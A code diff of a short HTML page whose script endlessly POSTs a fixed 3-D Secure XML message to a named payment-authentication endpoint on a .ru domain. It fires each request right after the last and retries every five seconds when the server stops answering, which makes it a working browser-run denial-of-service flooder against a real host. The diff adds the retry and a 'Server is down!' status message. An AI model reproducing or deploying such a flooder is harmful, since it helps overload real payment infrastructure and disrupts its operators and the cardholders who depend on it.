@@ -1,7 +1,6 @@
 <script>
-
     function request(i = 0) {
-
+        i++;
         fetch('https://acs.vendorcert.mirconnect.ru/mdpayacs/vereq', {
             method: 'POST',
             mode: 'no-cors',
@@ -9,13 +8,17 @@
             body: '<?xml version="1.0" encoding="UTF-8"?><ThreeDSecure><Message id="999"><VERes><version>1.0.2</version><CH><enrolled>Y</enrolled><acctID>A0fTY+pKUTu/6hcZWZJiAA==</acctID></CH><url>https://dropit.3dsecure.net:9443/PIT/ACS</url><protocol>ThreeDSecure</protocol></VERes></Message></ThreeDSecure>'
         })
         .then((response) => {
-            document.getElementById('message').innerHTML = ++i;
+            message('Requests: '+i);
             request(i);
+        })
+        .catch((error) => {
+            message('Requests: '+i+'<br>Server is down! Please wait for the page to refresh automatically');
+            setTimeout(() => request(i), 5000);
         });
-
     }
-
+    function message(text) {
+        document.getElementById('message').innerHTML = text;
+    }
     request();
-
 </script>
-<div id="message">0</div>
+<div id="message">Please wait</div>
